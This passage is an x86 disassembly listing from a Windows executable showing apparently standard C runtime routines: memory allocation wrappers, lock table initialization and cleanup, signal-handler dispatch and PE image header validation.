  406b07:	39 05 84 15 41 00    	cmp    %eax,0x411584
  406b0d:	74 40                	je     0x406b4f
  406b0f:	56                   	push   %esi
  406b10:	e8 88 db ff ff       	call   0x40469d
  406b15:	59                   	pop    %ecx
  406b16:	85 c0                	test   %eax,%eax
  406b18:	74 1d                	je     0x406b37
  406b1a:	83 fe e0             	cmp    $0xffffffe0,%esi
  406b1d:	76 cb                	jbe    0x406aea
  406b1f:	56                   	push   %esi
  406b20:	e8 78 db ff ff       	call   0x40469d
  406b25:	59                   	pop    %ecx
  406b26:	e8 82 d7 ff ff       	call   0x4042ad
  406b2b:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  406b31:	33 c0                	xor    %eax,%eax
  406b33:	5f                   	pop    %edi
  406b34:	5e                   	pop    %esi
  406b35:	5d                   	pop    %ebp
  406b36:	c3                   	ret
  406b37:	e8 71 d7 ff ff       	call   0x4042ad
  406b3c:	8b f0                	mov    %eax,%esi
  406b3e:	ff 15 8c b0 40 00    	call   *0x40b08c
  406b44:	50                   	push   %eax
  406b45:	e8 21 d7 ff ff       	call   0x40426b
  406b4a:	59                   	pop    %ecx
  406b4b:	89 06                	mov    %eax,(%esi)
  406b4d:	eb e2                	jmp    0x406b31
  406b4f:	e8 59 d7 ff ff       	call   0x4042ad
  406b54:	8b f0                	mov    %eax,%esi
  406b56:	ff 15 8c b0 40 00    	call   *0x40b08c
  406b5c:	50                   	push   %eax
  406b5d:	e8 09 d7 ff ff       	call   0x40426b
  406b62:	59                   	pop    %ecx
  406b63:	89 06                	mov    %eax,(%esi)
  406b65:	8b c7                	mov    %edi,%eax
  406b67:	eb ca                	jmp    0x406b33
  406b69:	83 25 00 16 41 00 00 	andl   $0x0,0x411600
  406b70:	c3                   	ret
  406b71:	8b ff                	mov    %edi,%edi
  406b73:	56                   	push   %esi
  406b74:	57                   	push   %edi
  406b75:	33 f6                	xor    %esi,%esi
  406b77:	bf f8 13 41 00       	mov    $0x4113f8,%edi
  406b7c:	83 3c f5 14 f5 40 00 	cmpl   $0x1,0x40f514(,%esi,8)
  406b83:	01 
  406b84:	75 1d                	jne    0x406ba3
  406b86:	8d 04 f5 10 f5 40 00 	lea    0x40f510(,%esi,8),%eax
  406b8d:	89 38                	mov    %edi,(%eax)
  406b8f:	68 a0 0f 00 00       	push   $0xfa0
  406b94:	ff 30                	push   (%eax)
  406b96:	83 c7 18             	add    $0x18,%edi
  406b99:	ff 15 90 b0 40 00    	call   *0x40b090
  406b9f:	85 c0                	test   %eax,%eax
  406ba1:	74 0c                	je     0x406baf
  406ba3:	46                   	inc    %esi
  406ba4:	83 fe 24             	cmp    $0x24,%esi
  406ba7:	7c d3                	jl     0x406b7c
  406ba9:	33 c0                	xor    %eax,%eax
  406bab:	40                   	inc    %eax
  406bac:	5f                   	pop    %edi
  406bad:	5e                   	pop    %esi
  406bae:	c3                   	ret
  406baf:	83 24 f5 10 f5 40 00 	andl   $0x0,0x40f510(,%esi,8)
  406bb6:	00 
  406bb7:	33 c0                	xor    %eax,%eax
  406bb9:	eb f1                	jmp    0x406bac
  406bbb:	8b ff                	mov    %edi,%edi
  406bbd:	53                   	push   %ebx
  406bbe:	8b 1d 94 b0 40 00    	mov    0x40b094,%ebx
  406bc4:	56                   	push   %esi
  406bc5:	be 10 f5 40 00       	mov    $0x40f510,%esi
  406bca:	57                   	push   %edi
  406bcb:	8b 3e                	mov    (%esi),%edi
  406bcd:	85 ff                	test   %edi,%edi
  406bcf:	74 13                	je     0x406be4
  406bd1:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
  406bd5:	74 0d                	je     0x406be4
  406bd7:	57                   	push   %edi
  406bd8:	ff d3                	call   *%ebx
  406bda:	57                   	push   %edi
  406bdb:	e8 cb cf ff ff       	call   0x403bab
  406be0:	83 26 00             	andl   $0x0,(%esi)
  406be3:	59                   	pop    %ecx
  406be4:	83 c6 08             	add    $0x8,%esi
  406be7:	81 fe 30 f6 40 00    	cmp    $0x40f630,%esi
  406bed:	7c dc                	jl     0x406bcb
  406bef:	be 10 f5 40 00       	mov    $0x40f510,%esi
  406bf4:	5f                   	pop    %edi
  406bf5:	8b 06                	mov    (%esi),%eax
  406bf7:	85 c0                	test   %eax,%eax
  406bf9:	74 09                	je     0x406c04
  406bfb:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
  406bff:	75 03                	jne    0x406c04
  406c01:	50                   	push   %eax
  406c02:	ff d3                	call   *%ebx
  406c04:	83 c6 08             	add    $0x8,%esi
  406c07:	81 fe 30 f6 40 00    	cmp    $0x40f630,%esi
  406c0d:	7c e6                	jl     0x406bf5
  406c0f:	5e                   	pop    %esi
  406c10:	5b                   	pop    %ebx
  406c11:	c3                   	ret
  406c12:	8b ff                	mov    %edi,%edi
  406c14:	55                   	push   %ebp
  406c15:	8b ec                	mov    %esp,%ebp
  406c17:	8b 45 08             	mov    0x8(%ebp),%eax
  406c1a:	ff 34 c5 10 f5 40 00 	push   0x40f510(,%eax,8)
  406c21:	ff 15 88 b0 40 00    	call   *0x40b088
  406c27:	5d                   	pop    %ebp
  406c28:	c3                   	ret
  406c29:	6a 0c                	push   $0xc
  406c2b:	68 20 d9 40 00       	push   $0x40d920
  406c30:	e8 9b de ff ff       	call   0x404ad0
  406c35:	33 ff                	xor    %edi,%edi
  406c37:	47                   	inc    %edi
  406c38:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  406c3b:	33 db                	xor    %ebx,%ebx
  406c3d:	39 1d f4 13 41 00    	cmp    %ebx,0x4113f4
  406c43:	75 18                	jne    0x406c5d
  406c45:	e8 3f f1 ff ff       	call   0x405d89
  406c4a:	6a 1e                	push   $0x1e
  406c4c:	e8 89 ef ff ff       	call   0x405bda
  406c51:	68 ff 00 00 00       	push   $0xff
  406c56:	e8 a7 db ff ff       	call   0x404802
  406c5b:	59                   	pop    %ecx
  406c5c:	59                   	pop    %ecx
  406c5d:	8b 75 08             	mov    0x8(%ebp),%esi
  406c60:	8d 34 f5 10 f5 40 00 	lea    0x40f510(,%esi,8),%esi
  406c67:	39 1e                	cmp    %ebx,(%esi)
  406c69:	74 04                	je     0x406c6f
  406c6b:	8b c7                	mov    %edi,%eax
  406c6d:	eb 6d                	jmp    0x406cdc
  406c6f:	6a 18                	push   $0x18
  406c71:	e8 4f da ff ff       	call   0x4046c5
  406c76:	59                   	pop    %ecx
  406c77:	8b f8                	mov    %eax,%edi
  406c79:	3b fb                	cmp    %ebx,%edi
  406c7b:	75 0f                	jne    0x406c8c
  406c7d:	e8 2b d6 ff ff       	call   0x4042ad
  406c82:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  406c88:	33 c0                	xor    %eax,%eax
  406c8a:	eb 50                	jmp    0x406cdc
  406c8c:	6a 0a                	push   $0xa
  406c8e:	e8 58 00 00 00       	call   0x406ceb
  406c93:	59                   	pop    %ecx
  406c94:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  406c97:	39 1e                	cmp    %ebx,(%esi)
  406c99:	75 2b                	jne    0x406cc6
  406c9b:	68 a0 0f 00 00       	push   $0xfa0
  406ca0:	57                   	push   %edi
  406ca1:	ff 15 90 b0 40 00    	call   *0x40b090
  406ca7:	85 c0                	test   %eax,%eax
  406ca9:	75 17                	jne    0x406cc2
  406cab:	57                   	push   %edi
  406cac:	e8 fa ce ff ff       	call   0x403bab
  406cb1:	59                   	pop    %ecx
  406cb2:	e8 f6 d5 ff ff       	call   0x4042ad
  406cb7:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  406cbd:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  406cc0:	eb 0b                	jmp    0x406ccd
  406cc2:	89 3e                	mov    %edi,(%esi)
  406cc4:	eb 07                	jmp    0x406ccd
  406cc6:	57                   	push   %edi
  406cc7:	e8 df ce ff ff       	call   0x403bab
  406ccc:	59                   	pop    %ecx
  406ccd:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406cd4:	e8 09 00 00 00       	call   0x406ce2
  406cd9:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406cdc:	e8 34 de ff ff       	call   0x404b15
  406ce1:	c3                   	ret
  406ce2:	6a 0a                	push   $0xa
  406ce4:	e8 29 ff ff ff       	call   0x406c12
  406ce9:	59                   	pop    %ecx
  406cea:	c3                   	ret
  406ceb:	8b ff                	mov    %edi,%edi
  406ced:	55                   	push   %ebp
  406cee:	8b ec                	mov    %esp,%ebp
  406cf0:	8b 45 08             	mov    0x8(%ebp),%eax
  406cf3:	56                   	push   %esi
  406cf4:	8d 34 c5 10 f5 40 00 	lea    0x40f510(,%eax,8),%esi
  406cfb:	83 3e 00             	cmpl   $0x0,(%esi)
  406cfe:	75 13                	jne    0x406d13
  406d00:	50                   	push   %eax
  406d01:	e8 23 ff ff ff       	call   0x406c29
  406d06:	59                   	pop    %ecx
  406d07:	85 c0                	test   %eax,%eax
  406d09:	75 08                	jne    0x406d13
  406d0b:	6a 11                	push   $0x11
  406d0d:	e8 92 dd ff ff       	call   0x404aa4
  406d12:	59                   	pop    %ecx
  406d13:	ff 36                	push   (%esi)
  406d15:	ff 15 84 b0 40 00    	call   *0x40b084
  406d1b:	5e                   	pop    %esi
  406d1c:	5d                   	pop    %ebp
  406d1d:	c3                   	ret
  406d1e:	8b ff                	mov    %edi,%edi
  406d20:	55                   	push   %ebp
  406d21:	8b ec                	mov    %esp,%ebp
  406d23:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406d26:	85 c9                	test   %ecx,%ecx
  406d28:	74 1b                	je     0x406d45
  406d2a:	6a e0                	push   $0xffffffe0
  406d2c:	33 d2                	xor    %edx,%edx
  406d2e:	58                   	pop    %eax
  406d2f:	f7 f1                	div    %ecx
  406d31:	3b 45 0c             	cmp    0xc(%ebp),%eax
  406d34:	73 0f                	jae    0x406d45
  406d36:	e8 72 d5 ff ff       	call   0x4042ad
  406d3b:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  406d41:	33 c0                	xor    %eax,%eax
  406d43:	5d                   	pop    %ebp
  406d44:	c3                   	ret
  406d45:	0f af 4d 0c          	imul   0xc(%ebp),%ecx
  406d49:	56                   	push   %esi
  406d4a:	8b f1                	mov    %ecx,%esi
  406d4c:	85 f6                	test   %esi,%esi
  406d4e:	75 01                	jne    0x406d51
  406d50:	46                   	inc    %esi
  406d51:	33 c0                	xor    %eax,%eax
  406d53:	83 fe e0             	cmp    $0xffffffe0,%esi
  406d56:	77 13                	ja     0x406d6b
  406d58:	56                   	push   %esi
  406d59:	6a 08                	push   $0x8
  406d5b:	ff 35 f4 13 41 00    	push   0x4113f4
  406d61:	ff 15 9c b0 40 00    	call   *0x40b09c
  406d67:	85 c0                	test   %eax,%eax
  406d69:	75 32                	jne    0x406d9d
  406d6b:	83 3d 84 15 41 00 00 	cmpl   $0x0,0x411584
  406d72:	74 1c                	je     0x406d90
  406d74:	56                   	push   %esi
  406d75:	e8 23 d9 ff ff       	call   0x40469d
  406d7a:	59                   	pop    %ecx
  406d7b:	85 c0                	test   %eax,%eax
  406d7d:	75 d2                	jne    0x406d51
  406d7f:	8b 45 10             	mov    0x10(%ebp),%eax
  406d82:	85 c0                	test   %eax,%eax
  406d84:	74 06                	je     0x406d8c
  406d86:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  406d8c:	33 c0                	xor    %eax,%eax
  406d8e:	eb 0d                	jmp    0x406d9d
  406d90:	8b 4d 10             	mov    0x10(%ebp),%ecx
  406d93:	85 c9                	test   %ecx,%ecx
  406d95:	74 06                	je     0x406d9d
  406d97:	c7 01 0c 00 00 00    	movl   $0xc,(%ecx)
  406d9d:	5e                   	pop    %esi
  406d9e:	5d                   	pop    %ebp
  406d9f:	c3                   	ret
  406da0:	6a 08                	push   $0x8
  406da2:	68 40 d9 40 00       	push   $0x40d940
  406da7:	e8 24 dd ff ff       	call   0x404ad0
  406dac:	e8 d4 f8 ff ff       	call   0x406685
  406db1:	8b 40 78             	mov    0x78(%eax),%eax
  406db4:	85 c0                	test   %eax,%eax
  406db6:	74 16                	je     0x406dce
  406db8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406dbc:	ff d0                	call   *%eax
  406dbe:	eb 07                	jmp    0x406dc7
  406dc0:	33 c0                	xor    %eax,%eax
  406dc2:	40                   	inc    %eax
  406dc3:	c3                   	ret
  406dc4:	8b 65 e8             	mov    -0x18(%ebp),%esp
  406dc7:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406dce:	e8 4d 19 00 00       	call   0x408720
  406dd3:	e8 3d dd ff ff       	call   0x404b15
  406dd8:	c3                   	ret
  406dd9:	e8 a7 f8 ff ff       	call   0x406685
  406dde:	8b 40 7c             	mov    0x7c(%eax),%eax
  406de1:	85 c0                	test   %eax,%eax
  406de3:	74 02                	je     0x406de7
  406de5:	ff d0                	call   *%eax
  406de7:	e9 b4 ff ff ff       	jmp    0x406da0
  406dec:	6a 08                	push   $0x8
  406dee:	68 60 d9 40 00       	push   $0x40d960
  406df3:	e8 d8 dc ff ff       	call   0x404ad0
  406df8:	ff 35 88 15 41 00    	push   0x411588
  406dfe:	ff 15 e8 b0 40 00    	call   *0x40b0e8
  406e04:	85 c0                	test   %eax,%eax
  406e06:	74 16                	je     0x406e1e
  406e08:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406e0c:	ff d0                	call   *%eax
  406e0e:	eb 07                	jmp    0x406e17
  406e10:	33 c0                	xor    %eax,%eax
  406e12:	40                   	inc    %eax
  406e13:	c3                   	ret
  406e14:	8b 65 e8             	mov    -0x18(%ebp),%esp
  406e17:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406e1e:	e8 7d ff ff ff       	call   0x406da0
  406e23:	cc                   	int3
  406e24:	68 a0 6d 40 00       	push   $0x406da0
  406e29:	ff 15 e4 b0 40 00    	call   *0x40b0e4
  406e2f:	a3 88 15 41 00       	mov    %eax,0x411588
  406e34:	c3                   	ret
  406e35:	8b ff                	mov    %edi,%edi
  406e37:	55                   	push   %ebp
  406e38:	8b ec                	mov    %esp,%ebp
  406e3a:	8b 45 08             	mov    0x8(%ebp),%eax
  406e3d:	a3 8c 15 41 00       	mov    %eax,0x41158c
  406e42:	a3 90 15 41 00       	mov    %eax,0x411590
  406e47:	a3 94 15 41 00       	mov    %eax,0x411594
  406e4c:	a3 98 15 41 00       	mov    %eax,0x411598
  406e51:	5d                   	pop    %ebp
  406e52:	c3                   	ret
  406e53:	8b ff                	mov    %edi,%edi
  406e55:	55                   	push   %ebp
  406e56:	8b ec                	mov    %esp,%ebp
  406e58:	8b 45 08             	mov    0x8(%ebp),%eax
  406e5b:	8b 0d 6c be 40 00    	mov    0x40be6c,%ecx
  406e61:	56                   	push   %esi
  406e62:	39 50 04             	cmp    %edx,0x4(%eax)
  406e65:	74 0f                	je     0x406e76
  406e67:	8b f1                	mov    %ecx,%esi
  406e69:	6b f6 0c             	imul   $0xc,%esi,%esi
  406e6c:	03 75 08             	add    0x8(%ebp),%esi
  406e6f:	83 c0 0c             	add    $0xc,%eax
  406e72:	3b c6                	cmp    %esi,%eax
  406e74:	72 ec                	jb     0x406e62
  406e76:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  406e79:	03 4d 08             	add    0x8(%ebp),%ecx
  406e7c:	5e                   	pop    %esi
  406e7d:	3b c1                	cmp    %ecx,%eax
  406e7f:	73 05                	jae    0x406e86
  406e81:	39 50 04             	cmp    %edx,0x4(%eax)
  406e84:	74 02                	je     0x406e88
  406e86:	33 c0                	xor    %eax,%eax
  406e88:	5d                   	pop    %ebp
  406e89:	c3                   	ret
  406e8a:	ff 35 94 15 41 00    	push   0x411594
  406e90:	ff 15 e8 b0 40 00    	call   *0x40b0e8
  406e96:	c3                   	ret
  406e97:	6a 20                	push   $0x20
  406e99:	68 80 d9 40 00       	push   $0x40d980
  406e9e:	e8 2d dc ff ff       	call   0x404ad0
  406ea3:	33 ff                	xor    %edi,%edi
  406ea5:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  406ea8:	89 7d d8             	mov    %edi,-0x28(%ebp)
  406eab:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406eae:	83 fb 0b             	cmp    $0xb,%ebx
  406eb1:	7f 4b                	jg     0x406efe
  406eb3:	74 15                	je     0x406eca
  406eb5:	8b c3                	mov    %ebx,%eax
  406eb7:	6a 02                	push   $0x2
  406eb9:	59                   	pop    %ecx
  406eba:	2b c1                	sub    %ecx,%eax
  406ebc:	74 22                	je     0x406ee0
  406ebe:	2b c1                	sub    %ecx,%eax
  406ec0:	74 08                	je     0x406eca
  406ec2:	2b c1                	sub    %ecx,%eax
  406ec4:	74 59                	je     0x406f1f
  406ec6:	2b c1                	sub    %ecx,%eax
  406ec8:	75 43                	jne    0x406f0d
  406eca:	e8 3d f7 ff ff       	call   0x40660c
  406ecf:	8b f8                	mov    %eax,%edi
  406ed1:	89 7d d8             	mov    %edi,-0x28(%ebp)
  406ed4:	85 ff                	test   %edi,%edi
  406ed6:	75 14                	jne    0x406eec
  406ed8:	83 c8 ff             	or     $0xffffffff,%eax
  406edb:	e9 54 01 00 00       	jmp    0x407034
  406ee0:	be 8c 15 41 00       	mov    $0x41158c,%esi
  406ee5:	a1 8c 15 41 00       	mov    0x41158c,%eax
  406eea:	eb 55                	jmp    0x406f41
  406eec:	ff 77 5c             	push   0x5c(%edi)
  406eef:	8b d3                	mov    %ebx,%edx
  406ef1:	e8 5d ff ff ff       	call   0x406e53
  406ef6:	59                   	pop    %ecx
  406ef7:	8d 70 08             	lea    0x8(%eax),%esi
  406efa:	8b 06                	mov    (%esi),%eax
  406efc:	eb 51                	jmp    0x406f4f
  406efe:	8b c3                	mov    %ebx,%eax
  406f00:	83 e8 0f             	sub    $0xf,%eax
  406f03:	74 32                	je     0x406f37
  406f05:	83 e8 06             	sub    $0x6,%eax
  406f08:	74 21                	je     0x406f2b
  406f0a:	48                   	dec    %eax
  406f0b:	74 12                	je     0x406f1f
  406f0d:	e8 9b d3 ff ff       	call   0x4042ad
  406f12:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  406f18:	e8 3e d3 ff ff       	call   0x40425b
  406f1d:	eb b9                	jmp    0x406ed8
  406f1f:	be 94 15 41 00       	mov    $0x411594,%esi
  406f24:	a1 94 15 41 00       	mov    0x411594,%eax
  406f29:	eb 16                	jmp    0x406f41
  406f2b:	be 90 15 41 00       	mov    $0x411590,%esi
  406f30:	a1 90 15 41 00       	mov    0x411590,%eax
  406f35:	eb 0a                	jmp    0x406f41
  406f37:	be 98 15 41 00       	mov    $0x411598,%esi
  406f3c:	a1 98 15 41 00       	mov    0x411598,%eax
  406f41:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  406f48:	50                   	push   %eax
  406f49:	ff 15 e8 b0 40 00    	call   *0x40b0e8
  406f4f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406f52:	33 c0                	xor    %eax,%eax
  406f54:	83 7d e0 01          	cmpl   $0x1,-0x20(%ebp)
  406f58:	0f 84 d6 00 00 00    	je     0x407034
  406f5e:	39 45 e0             	cmp    %eax,-0x20(%ebp)
  406f61:	75 07                	jne    0x406f6a
  406f63:	6a 03                	push   $0x3
  406f65:	e8 06 db ff ff       	call   0x404a70
  406f6a:	39 45 e4             	cmp    %eax,-0x1c(%ebp)
  406f6d:	74 07                	je     0x406f76
  406f6f:	50                   	push   %eax
  406f70:	e8 76 fd ff ff       	call   0x406ceb
  406f75:	59                   	pop    %ecx
  406f76:	33 c0                	xor    %eax,%eax
  406f78:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406f7b:	83 fb 08             	cmp    $0x8,%ebx
  406f7e:	74 0a                	je     0x406f8a
  406f80:	83 fb 0b             	cmp    $0xb,%ebx
  406f83:	74 05                	je     0x406f8a
  406f85:	83 fb 04             	cmp    $0x4,%ebx
  406f88:	75 1b                	jne    0x406fa5
  406f8a:	8b 4f 60             	mov    0x60(%edi),%ecx
  406f8d:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  406f90:	89 47 60             	mov    %eax,0x60(%edi)
  406f93:	83 fb 08             	cmp    $0x8,%ebx
  406f96:	75 3e                	jne    0x406fd6
  406f98:	8b 4f 64             	mov    0x64(%edi),%ecx
  406f9b:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  406f9e:	c7 47 64 8c 00 00 00 	movl   $0x8c,0x64(%edi)
  406fa5:	83 fb 08             	cmp    $0x8,%ebx
  406fa8:	75 2c                	jne    0x406fd6
  406faa:	8b 0d 60 be 40 00    	mov    0x40be60,%ecx
  406fb0:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  406fb3:	8b 0d 64 be 40 00    	mov    0x40be64,%ecx
  406fb9:	03 0d 60 be 40 00    	add    0x40be60,%ecx
  406fbf:	39 4d dc             	cmp    %ecx,-0x24(%ebp)
  406fc2:	7d 19                	jge    0x406fdd
  406fc4:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406fc7:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  406fca:	8b 57 5c             	mov    0x5c(%edi),%edx
  406fcd:	89 44 11 08          	mov    %eax,0x8(%ecx,%edx,1)
  406fd1:	ff 45 dc             	incl   -0x24(%ebp)
  406fd4:	eb dd                	jmp    0x406fb3
  406fd6:	e8 fa f4 ff ff       	call   0x4064d5
  406fdb:	89 06                	mov    %eax,(%esi)
  406fdd:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406fe4:	e8 15 00 00 00       	call   0x406ffe
  406fe9:	83 fb 08             	cmp    $0x8,%ebx
  406fec:	75 1f                	jne    0x40700d
  406fee:	ff 77 64             	push   0x64(%edi)
  406ff1:	53                   	push   %ebx
  406ff2:	ff 55 e0             	call   *-0x20(%ebp)
  406ff5:	59                   	pop    %ecx
  406ff6:	eb 19                	jmp    0x407011
  406ff8:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406ffb:	8b 7d d8             	mov    -0x28(%ebp),%edi
  406ffe:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  407002:	74 08                	je     0x40700c
  407004:	6a 00                	push   $0x0
  407006:	e8 07 fc ff ff       	call   0x406c12
  40700b:	59                   	pop    %ecx
  40700c:	c3                   	ret
  40700d:	53                   	push   %ebx
  40700e:	ff 55 e0             	call   *-0x20(%ebp)
  407011:	59                   	pop    %ecx
  407012:	83 fb 08             	cmp    $0x8,%ebx
  407015:	74 0a                	je     0x407021
  407017:	83 fb 0b             	cmp    $0xb,%ebx
  40701a:	74 05                	je     0x407021
  40701c:	83 fb 04             	cmp    $0x4,%ebx
  40701f:	75 11                	jne    0x407032
  407021:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407024:	89 47 60             	mov    %eax,0x60(%edi)
  407027:	83 fb 08             	cmp    $0x8,%ebx
  40702a:	75 06                	jne    0x407032
  40702c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40702f:	89 47 64             	mov    %eax,0x64(%edi)
  407032:	33 c0                	xor    %eax,%eax
  407034:	e8 dc da ff ff       	call   0x404b15
  407039:	c3                   	ret
  40703a:	8b ff                	mov    %edi,%edi
  40703c:	55                   	push   %ebp
  40703d:	8b ec                	mov    %esp,%ebp
  40703f:	8b 45 08             	mov    0x8(%ebp),%eax
  407042:	a3 a0 15 41 00       	mov    %eax,0x4115a0
  407047:	5d                   	pop    %ebp
  407048:	c3                   	ret
  407049:	8b ff                	mov    %edi,%edi
  40704b:	55                   	push   %ebp
  40704c:	8b ec                	mov    %esp,%ebp
  40704e:	8b 45 08             	mov    0x8(%ebp),%eax
  407051:	a3 a4 15 41 00       	mov    %eax,0x4115a4
  407056:	5d                   	pop    %ebp
  407057:	c3                   	ret
  407058:	8b ff                	mov    %edi,%edi
  40705a:	56                   	push   %esi
  40705b:	57                   	push   %edi
  40705c:	33 ff                	xor    %edi,%edi
  40705e:	ff b7 30 f6 40 00    	push   0x40f630(%edi)
  407064:	ff 15 e4 b0 40 00    	call   *0x40b0e4
  40706a:	89 87 30 f6 40 00    	mov    %eax,0x40f630(%edi)
  407070:	83 c7 04             	add    $0x4,%edi
  407073:	83 ff 28             	cmp    $0x28,%edi
  407076:	72 e6                	jb     0x40705e
  407078:	5f                   	pop    %edi
  407079:	5e                   	pop    %esi
  40707a:	c3                   	ret
  40707b:	cc                   	int3
  40707c:	cc                   	int3
  40707d:	cc                   	int3
  40707e:	cc                   	int3
  40707f:	cc                   	int3
  407080:	8b ff                	mov    %edi,%edi
  407082:	55                   	push   %ebp
  407083:	8b ec                	mov    %esp,%ebp
  407085:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407088:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  40708d:	66 39 01             	cmp    %ax,(%ecx)
  407090:	74 04                	je     0x407096
  407092:	33 c0                	xor    %eax,%eax
  407094:	5d                   	pop    %ebp
  407095:	c3                   	ret
  407096:	8b 41 3c             	mov    0x3c(%ecx),%eax
  407099:	03 c1                	add    %ecx,%eax
  40709b:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  4070a1:	75 ef                	jne    0x407092
  4070a3:	33 d2                	xor    %edx,%edx
  4070a5:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  4070aa:	66 39 48 18          	cmp    %cx,0x18(%eax)
  4070ae:	0f 94 c2             	sete   %dl
  4070b1:	8b c2                	mov    %edx,%eax
  4070b3:	5d                   	pop    %ebp
  4070b4:	c3                   	ret
  4070b5:	cc                   	int3
  4070b6:	cc                   	int3
  4070b7:	cc                   	int3
  4070b8:	cc                   	int3
  4070b9:	cc                   	int3
  4070ba:	cc                   	int3
  4070bb:	cc                   	int3
  4070bc:	cc                   	int3
  4070bd:	cc                   	int3
  4070be:	cc                   	int3
  4070bf:	cc                   	int3
  4070c0:	8b ff                	mov    %edi,%edi
  4070c2:	55                   	push   %ebp
  4070c3:	8b ec                	mov    %esp,%ebp
  4070c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4070c8:	8b 48 3c             	mov    0x3c(%eax),%ecx
  4070cb:	03 c8                	add    %eax,%ecx
  4070cd:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  4070d1:	53                   	push   %ebx
  4070d2:	56                   	push   %esi
  4070d3:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
  4070d7:	33 d2                	xor    %edx,%edx
  4070d9:	57                   	push   %edi
  4070da:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
  4070de:	85 f6                	test   %esi,%esi
  4070e0:	74 1b                	je     0x4070fd
  4070e2:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4070e5:	8b 48 0c             	mov    0xc(%eax),%ecx
  4070e8:	3b f9                	cmp    %ecx,%edi
  4070ea:	72 09                	jb     0x4070f5
  4070ec:	8b 58 08             	mov    0x8(%eax),%ebx
  4070ef:	03 d9                	add    %ecx,%ebx
  4070f1:	3b fb                	cmp    %ebx,%edi
  4070f3:	72 0a                	jb     0x4070ff
  4070f5:	42                   	inc    %edx
  4070f6:	83 c0 28             	add    $0x28,%eax
  4070f9:	3b d6                	cmp    %esi,%edx
  4070fb:	72 e8                	jb     0x4070e5
  4070fd:	33 c0                	xor    %eax,%eax
  4070ff:	5f                   	pop    %edi
  407100:	5e                   	pop    %esi
  407101:	5b                   	pop    %ebx
  407102:	5d                   	pop    %ebp
  407103:	c3                   	ret
  407104:	cc                   	int3
  407105:	cc                   	int3
  407106:	cc                   	int3
  407107:	cc                   	int3
  407108:	cc                   	int3
  407109:	cc                   	int3
  40710a:	cc                   	int3
  40710b:	cc                   	int3
  40710c:	cc                   	int3
  40710d:	cc                   	int3
  40710e:	cc                   	int3
  40710f:	cc                   	int3
  407110:	8b ff                	mov    %edi,%edi
  407112:	55                   	push   %ebp
  407113:	8b ec                	mov    %esp,%ebp
  407115:	6a fe                	push   $0xfffffffe
  407117:	68 a0 d9 40 00       	push   $0x40d9a0
  40711c:	68 30 4b 40 00       	push   $0x404b30
  407121:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  407127:	50                   	push   %eax
  407128:	83 ec 08             	sub    $0x8,%esp
  40712b:	53                   	push   %ebx
  40712c:	56                   	push   %esi
  40712d:	57                   	push   %edi
  40712e:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  407133:	31 45 f8             	xor    %eax,-0x8(%ebp)
  407136:	33 c5                	xor    %ebp,%eax
  407138:	50                   	push   %eax
  407139:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40713c:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407142:	89 65 e8             	mov    %esp,-0x18(%ebp)
  407145:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40714c:	68 00 00 40 00       	push   $0x400000
  407151:	e8 2a ff ff ff       	call   0x407080
  407156:	83 c4 04             	add    $0x4,%esp
  407159:	85 c0                	test   %eax,%eax
  40715b:	74 54                	je     0x4071b1
  40715d:	8b 45 08             	mov    0x8(%ebp),%eax
  407160:	2d 00 00 40 00       	sub    $0x400000,%eax
  407165:	50                   	push   %eax
  407166:	68 00 00 40 00       	push   $0x400000
  40716b:	e8 50 ff ff ff       	call   0x4070c0
  407170:	83 c4 08             	add    $0x8,%esp
  407173:	85 c0                	test   %eax,%eax
  407175:	74 3a                	je     0x4071b1
  407177:	8b 40 24             	mov    0x24(%eax),%eax
  40717a:	c1 e8 1f             	shr    $0x1f,%eax
  40717d:	f7 d0                	not    %eax
  40717f:	83 e0 01             	and    $0x1,%eax
  407182:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
